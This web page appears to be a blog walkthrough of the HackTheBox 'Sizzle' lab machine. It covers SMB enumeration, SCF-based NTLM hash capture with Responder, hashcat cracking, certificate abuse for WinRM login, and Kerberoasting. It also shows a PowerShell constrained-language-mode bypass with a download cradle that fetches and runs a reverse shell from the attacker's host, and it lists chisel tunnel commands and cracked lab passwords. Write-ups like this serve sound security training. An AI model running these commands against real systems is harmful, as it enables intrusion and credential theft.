<!DOCTYPE html>
<html>
  <head>
    <title>Pwny_Sec</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2019-07-22T21:23:05 EDT">
<title>Sizzle-Gold :: Pwny_Sec</title>
<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
<link href="/css/font-awesome.min.css" rel="stylesheet">
<link href="/css/nucleus.css" rel="stylesheet">
<link href="/theme-flex/style.css" rel="stylesheet">

	<link href="/theme-flex/variant-red.css" rel="stylesheet">

<link rel="stylesheet" href="/css/bootstrap.min.css">
<script src="/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
      var baseurl = "\/";
</script>
<meta name="description" content="">



    
  </head>
  <body data-url="/hackthebox/boxes/gold-sizzle/">
    
      <header>
  <div class="logo">
    




<h2 id="pwny-sec">Pwny_Sec</h2>




  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://twitter.com/pwny_sec"  rel="noopener">
                  <i class='fa fa-twitter'></i> <label>Twitter</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
                  <i class='fa fa-github'></i> <label>Github repo</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
                  <i class='fa fa-cloud-download'></i> <label>Download</label>
                </a>
            </li>
            <li class="" role="">
                <a href="#"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
                </a>
            </li>
            <li class="" role="">
                <a href="/credits"  rel="noopener">
                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
<li data-nav-id="/concepts/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/dll/" class="dd-item">
    <div>
        <a href="/concepts/dll/">
            DLL-Hijacking
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/file-transfer/" class="dd-item">
    <div>
        <a href="/concepts/file-transfer/">
            File Transfer
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/linux_enum/" class="dd-item">
    <div>
        <a href="/concepts/linux_enum/">
            Linux Enumeration
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/concepts/windows_enum/" class="dd-item">
    <div>
        <a href="/concepts/windows_enum/">
            Windows
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/bypass/" class="dd-item">
    <div>
        <a href="/concepts/bypass/">
            Windows-Bypass
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/">HackTheBox</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/boxes/">Boxes</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/chaos-og/">
            CHAOS
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/inusectf/">
            CTF
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier/">
            Carrier
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier-root/">
            CarrierRoot
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/devel/">
            Devel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/ethereal/">
            Ethereal
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/flujab/">
            Flujab
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/friendzone/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/friendzone/">
            FriendZone
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/grand-pa/">
            GrandMa
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/lightweight/">
            LightWeight
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/optimum/">
            Optimum
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/sizzle/">
            Sizzle
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item active">
    <div>
        <a href="/hackthebox/boxes/gold-sizzle/">
            Sizzle-Gold
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/vault/">
            Vault
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/teacher/">
            teacher
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
    <div>
        <a href="/hackthebox/github/hugopowershell/">
            Hugo/Github/Power
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
    <div>
        <a href="/hackthebox/challenges/bloodhound/">
            
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>
<li data-nav-id="/help/" class="dd-item
        ">
    <div>

        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/bloodhound/" class="dd-item">
    <div>
        <a href="/tools/bloodhound/">
            BloodHound Neo4j
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/chisel/" class="dd-item">
    <div>
        <a href="/tools/chisel/">
            ChiselTunnel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ftp/" class="dd-item">
    <div>
        <a href="/tools/ftp/">
            FTP
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/hydra/" class="dd-item
        ">
    <div>

        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/nmap/" class="dd-item">
    <div>
        <a href="/tools/nmap/">
            Nmap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/smb/smb/" class="dd-item">
    <div>
        <a href="/tools/smb/smb/">
            SMB
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/snmpwalk/" class="dd-item
        ">
    <div>

        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/webapp/burp/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
    <div>
        <a href="/tools/webapp/sqlmap/sqlmap/">
            SqlMap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/ssh/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>



    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/concepts/" >
   Concept</option>
    <option value="/hackthebox/" >
   HackTheBox</option> 
    <option value="/hackthebox/boxes/" >
  - 
   Boxes</option> 
    <option value="/hackthebox/boxes/hawk/" >
  -- 
   </option>
    <option value="/hackthebox/boxes/blue/" >
  -- 
   Blue</option>
      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
    <option value="/hackthebox/boxes/crimestoppers/" >
  -- 
   CrimeStopper</option>
      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
      <option value="/hackthebox/boxes/friendzone/" >-- FriendZone</option>
      <option value="/hackthebox/boxes/grand-pa/" >-- GrandMa</option>
    <option value="/hackthebox/boxes/legacy/" >
  -- 
   Legacy</option>
      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
    <option value="/hackthebox/boxes/mischief/" >
  -- 
   Mischief</option>
      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
    <option value="/hackthebox/boxes/poison/" >
  -- 
   Poison</option>
    <option value="/hackthebox/boxes/secnotes/" >
  -- 
   SecNotes</option>
      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
      <option value="/hackthebox/boxes/gold-sizzle/"  selected>-- Sizzle-Gold</option>
    <option value="/hackthebox/boxes/valentine/" >
  -- 
   Valentine</option>
      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
    <option value="/hackthebox/boxes/waldo/" >
  -- 
   Waldo</option>
    <option value="/hackthebox/boxes/zipper/" >
  -- 
   Zipper</option>
    <option value="/hackthebox/boxes/oz/" >
  -- 
   oz</option>
    <option value="/hackthebox/boxes/sunday/" >
  -- 
   sunday</option>
      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
  
    <option value="/hackthebox/github/" >
  - 
   GitHub</option>
    <option value="/hackthebox/challenges/" >
  - 
   Miscellaneous</option>
  
    <option value="/help/" >
   Network Manager Down</option>
    <option value="/tools/" >
   Tools</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
        <script type="text/javascript" src="/js/lunr.min.js"></script>
        <script type="text/javascript" src="/js/auto-complete.js"></script>
        <link href="/css/auto-complete.css" rel="stylesheet">
        <script type="text/javascript">
          
              var baseurl = "\/";
          
        </script>
        <script type="text/javascript" src="/js/search.js"></script>
      </div>
    

    <h1>Sizzle-Gold</h1>
    
    
    
    

<p><img src="https://chickenpwny.github.io/images/sizzle/smbgazebos.jpg" alt="smbgazebos" /></p>

<p>Nmap</p>

<pre><code>80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
</code></pre>

<pre><code>445/tcp   open  microsoft-ds?
</code></pre>

<pre><code>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-06-03T11:45:21
|_Not valid after:  2020-06-02T11:45:21
|_ssl-date: 2019-06-03T15:07:26+00:00; -6m04s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
</code></pre>

<p><strong>WEB APPLICATION ####  PHASE 1 #####</strong></p>

<p>​   <img src="https://chickenpwny.github.io/images/sizzle/webpage-initial.PNG" alt="webpage-initial" /></p>

<p>Gobuster</p>

<pre><code>gobuster -w /home/htb/wordlist/seclist/Discovery/Web-Content/IIS.fuzz.txt -u http://10.10.10.103/ -t 40 
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/gobuster-iis.PNG" alt="gobuster-iis" /></p>

<p>Wfuzz</p>

<pre><code>wfuzz --hc 404 -c -w  /home/htb/wordlist/seclist/Discovery/Web-Content/IIS.fuzz.txt &quot;http://sizzle.htb/FUZZ&quot;
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/wfuzz-IIS.PNG" alt="wfuzz-IIS" /></p>

<p>SIZZLE.HTB/CERTSRV</p>

<p><img src="https://chickenpwny.github.io/images/sizzle/webpage-initial2.PNG" alt="webpage-initial2" /></p>

<h3 id="smb-enumeration-phase2"><strong>SMB ENUMERATION ####  PHASE2  #####</strong></h3>

<p><img src="https://chickenpwny.github.io/images/sizzle/shares.jpg" alt="shares" /></p>

<p>SMB - here we will find that the shares are not writeable. That the directories subfolder are writeable. that when a share is listed as READ ONLY that is refereeing tot he share itself. That doesn&rsquo;t mean the shares aren&rsquo;t writeable. Writing a simple bash script to enumerate the shares. then droping a scf file that will contect back to our host. Responder will collect the users ntlm hash.</p>

<p>SMB) FOO</p>

<pre><code>smbmap -H 10.10.10.103
smbclient -N -L //10.10.10.103
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/smb-enum3.PNG" alt="smb-enum3" /></p>

<p>Mounting the Share locally &amp; FOR LOOP TOUCH ALL YOU OVER</p>

<p>How this trick works is we will see the script produce permission denied errors and compare the denied errors to the shares the ones that don&rsquo;t ahve the error are writeable.</p>

<pre><code>mount -o user=guest '//10.10.15.105/Department Shares' /mnt/sizzle
</code></pre>

<pre><code>#!/bin/bash
for folder in /mnt/sizzle/**/*; do touch &quot;$folder&quot;;done
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/smb-enum.PNG" alt="smb-enum" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/smb-enum2.PNG" alt="smb-enum2" /></p>

<p>SCF ##  shell command file performs a limited set of windows explorer commands. opening windows explorer or showing the desktop. one of the functions of this file is you can pull the icon image from the internet. whenever the file is browsed it will connect back to a smb our smb-server.</p>

<p>copy the scf file over to &lsquo;department shares&rsquo;\public\, then setup responder like below.</p>

<h3 id="references">references</h3>

<ul>
<li><a href="https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/">https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/</a></li>

<li><p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></p>

<pre><code>[Shell]
Command=2
IconFile=\\CHANGE ME\pie.ico
[Tashbar]
Command=ToggleDesktop
</code></pre></li>
</ul>

<p><strong>Responder</strong></p>

<pre><code>responder -I tun0 -e 10.10.10.103
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/smb-enum4.PNG" alt="smb-enum4" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/amanda-ntlm-hashes.PNG" alt="amanda-ntlm-hashes" /></p>

<p>HASHCAT / john sucks</p>

<p><img src="https://chickenpwny.github.io/images/sizzle/hashcat-1000x479.jpg" alt="hashcat-1000x479" /></p>

<p>When saving the hashes in notepad be sure to encode using <strong>ANSI</strong> or you will get a bit error. modules 5600 for ntlm hashes using rock you shouldn&rsquo;t take long.</p>

<pre><code> .\hashcat64.exe -m 13100 .\mrlky.hashes .\rockyou.txt
 .\hashcat64.exe -m 13100 .\mrlky.hashes .\rockyou.txt --show
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/savehashes.PNG" alt="savehashes" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/hashcat.PNG" alt="hashcat" /></p>

<h3 id="myca-phase-3"><strong>MYCA   ### PHASE  3###</strong></h3>

<p>We will login as amanda and get the certificate authority and use openssll to sign some certs and login using winrm. Editing a winrm script to use certs.</p>

<p><strong>reference</strong></p>

<ul>
<li><a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb</a></li>
</ul>

<p>Microsoft Active Directory Certificate Services</p>

<p>provides a web platform for issueing anad managing public keys infrastructure or pki certificates. When you logon as a valid user if will issue you a cert of any kind a CA or public key.</p>

<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert3.PNG" alt="install-cert3" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert2.PNG" alt="install-cert2" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert4.PNG" alt="install-cert4" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert.PNG" alt="install-cert" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/mozilla-cert.PNG" alt="mozilla-cert" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert5.PNG" alt="install-cert5" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert6.PNG" alt="install-cert6" /></p>

<p>OPENSSL making the ssl certs. this creates two distinct files.</p>

<pre><code>openssl pkcs12 -in amanda.p12 -nocerts -out amanda.key
openssl pkcs12 -in amanda.p12 -clcerts -nokey -out amanda.crt
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/md5sum.PNG" alt="md5sum" /></p>

<p>CHANGES MADE TO WINRM RUBY</p>

<p>I’m not sure why the my connection kept closing and i had to retype  the darn passphrase hundreds of times. So i went looking for away to fix  this annonyans. key_pass was the solution.</p>

<pre><code>ruby script.rb
</code></pre>

<p><a href="http://paste.openstack.org/show/197184/">http://paste.openstack.org/show/197184/</a></p>

<pre><code>conn = WinRM::Connection.new(
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: 'amanda_crt.pem',
  client_key: 'amanda_key.pem',
  key_pass: 'Ashare1972',
#  user: 'amanda'
# password: 'Ashare1972',
  :no_ssl_peer_verification =&gt; true
)
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/ssl_stuff.PNG" alt="ssl_stuff" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/winrm-key.PNG" alt="winrm-key" /></p>

<p>CLM / CHISEL TUNNELS     ##### PHASE 4 #####</p>

<p>First we will bypass constrained language mode. then move chisel over using invoke web request. Explore some windows directories that have write and execute permissions.</p>

<p>This command is used to find out if you are in a clm</p>

<pre><code>$ExecutionContext.SessionState.LanguageMode
</code></pre>

<p>Next we need to understand the .net frameworks in place. version to has a bypass we can use powershell2.</p>

<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP&quot;           
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/net-framework.PNG" alt="net-framework" /></p>

<pre><code>PowerShell -Version 2 -ExecutionPolicy ByPass -command &quot;command here&quot;
</code></pre>

<p>Now setup python simple http server.  we will using a nishang shell to bypass clm.  this should land you in a shell without clm. next upload chisel, setup a chisel proxy allowing us to access port 88 which on the localhost.</p>

<ul>
<li><a href="https://github.com/samratashok/nishang/tree/master/Shells">https://github.com/samratashok/nishang/tree/master/Shells</a></li>

<li><p><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>

<pre><code>python3 -m http.server 80
nc -lvnp portNUmbers
</code></pre>

<pre><code>PowerShell -Version 2 -ExecutionPolicy ByPass -command &quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.49/Invoke-PowerShellTcp.ps1')&quot;
</code></pre>

<pre><code>powershell iwr &quot;http://10.10.15.105/chisel.exe&quot; -outfile chisel.exe
</code></pre></li>
</ul>

<p>Setting up the chisel servers &amp; clients there are handful ways to setup the chisel proxy. The first is overly complex will requirer multiple shells to do. the second is simpler and the last is darn simple. setting up the server is the easiest part.</p>

<p>1)</p>

<pre><code>./chisel server -p 8000 --reverse -v
.\chisel.exe client 10.10.14.49:8000 R:88:127.0.0.1:1337
.\chisel.exe server -p 1337 --socks5
./chisel client 127.0.0.1:88 socks
</code></pre>

<p>2)</p>

<pre><code>.\chisel.exe client 10.10.14.49:8000 R:88:127.0.0.1:88 R:389:localhost:389
</code></pre>

<p>3)</p>

<pre><code>.\chisel.exe client 10.10.15.105:8000 R:127.0.0.1:8001:localhost:88	
</code></pre>

<p>server)     ## -v is important</p>

<pre><code>./chisel server -port 8000 --reverse -v
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/chisel.PNG" alt="chisel" /></p>

<p>The finale part for this phase is collecting mrlky kerb hashes. using GetUserSPNs.py  which can be found in IMPACKET ON KALI locate getuserspns.py. getuserspns.py just hangs. smb wont work if there is a huge time difference between the two host &amp; client.</p>

<p>linux uses military time so 10pm is 22 when chaning the time.</p>

<pre><code> GetUserSPNs.py -request -dc-ip 10.10.10.103 sizzle.htb/amanda -save -outputfile GetUserSPNs.out
</code></pre>

<pre><code>victim 		Saturday, June 8, 2019 10:16:04 PM
kali		Sat 08 Jun 2019 10:21:24 PM EDT
date +%T -s &quot;windowstime&quot;
</code></pre>

<pre><code>./GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out w
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/mrlkyhashes.PNG" alt="mrlkyhashes" /></p>

<p>HASHCAT - Kerberos 5</p>

<p>This didn&rsquo;t take that long to brute force luckily. be sure to save the file in ANIS. Using 13100</p>

<pre><code>.\hashcat64.exe -m 13100 .\mrlky.hashes .\rockyou.txt
.\hashcat64.exe -m 13100 .\mrlky.hashes .\rockyou.txt --show
Football#7
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/mrlkyhashes2.PNG" alt="mrlkyhashes2" /></p>

<p>WEBAPP AGAIN MRLKY MYCA #### PHASE 5 #####</p>

<p>Need to repeat phase3, reset the browser cookies or open a private windows.  login as mrlky, then generate the cert. use openssl to generate our own certs. name everything differently or make different directories dont want a cluttered worksite.</p>

